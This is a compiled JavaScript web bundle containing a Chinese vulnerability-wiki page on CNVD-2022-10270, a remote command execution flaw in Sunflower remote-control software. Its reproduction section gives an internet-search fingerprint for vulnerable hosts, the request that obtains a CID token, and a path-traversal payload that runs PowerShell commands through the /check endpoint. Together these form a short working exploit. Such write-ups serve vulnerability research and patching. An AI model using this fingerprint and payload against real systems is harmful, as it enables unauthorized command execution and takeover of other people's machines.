(window.webpackJsonp=window.webpackJsonp||[]).push([[222],{1922:function(t,a,s){t.exports=s.p+"assets/img/1645007224265-6dd3bed6-0d66-433d-96db-2532796ded2a.f130ef3e.png"},1923:function(t,a,s){t.exports=s.p+"assets/img/1645007276844-29bf52d8-e4c4-4ece-8d9e-a5e2386de7c2.947fff50.png"},1924:function(t,a,s){t.exports=s.p+"assets/img/1645007355798-42ab03f8-8652-4daf-a4c3-29938ce2f000.44a78166.png"},3072:function(t,a,s){"use strict";s.r(a);var r=s(64),e=Object(r.a)({},(function(){var t=this,a=t._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"向日葵-check-远程命令执行漏洞-cnvd-2022-10270"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#向日葵-check-远程命令执行漏洞-cnvd-2022-10270"}},[t._v("#")]),t._v(" 向日葵 check 远程命令执行漏洞 CNVD-2022-10270")]),t._v(" "),a("h2",{attrs:{id:"漏洞描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),a("p",[t._v("向日葵通过发送特定的请求获取CID后，可调用 check接口实现远程命令执行，导致服务器权限被获取")]),t._v(" "),a("h2",{attrs:{id:"漏洞影响"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),a("a-checkbox",{attrs:{checked:""}},[t._v("11.0.0.33162")]),a("br"),t._v(" "),a("h2",{attrs:{id:"网络测绘"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[t._v("#")]),t._v(" 网络测绘")]),t._v(" "),a("a-checkbox",{attrs:{checked:""}},[t._v('body="Verification failure"')]),a("br"),t._v(" "),a("h2",{attrs:{id:"漏洞复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),a("p",[t._v("向日葵在开启后会默认在 40000-65535 之间开启某端口")]),t._v(" "),a("p",[a("img",{attrs:{src:s(1922),alt:"img"}})]),t._v(" "),a("p",[t._v("发送请求获取CID")]),t._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("cgi"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("bin"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("rpc"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("?")]),t._v("action"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("verify"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("haras\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:s(1923),alt:"img"}})]),t._v(" "),a("p",[t._v("使用获取到的 verify_string 作为 cookie的 CID字段，进行命令执行")]),t._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("check"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("?")]),t._v("cmd"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("ping"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("2F"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("2F"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("2F"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("2F"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("2F"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("2F"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("2F"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("2F"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("2Fwindows"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("2Fsystem32"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("2FWindowsPowerShell"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("2Fv1"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v("2Fpowershell"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("exe"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v("ipconfig\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:s(1924),alt:"img"}})])],1)}),[],!1,null,null,null);a.default=e.exports}}]);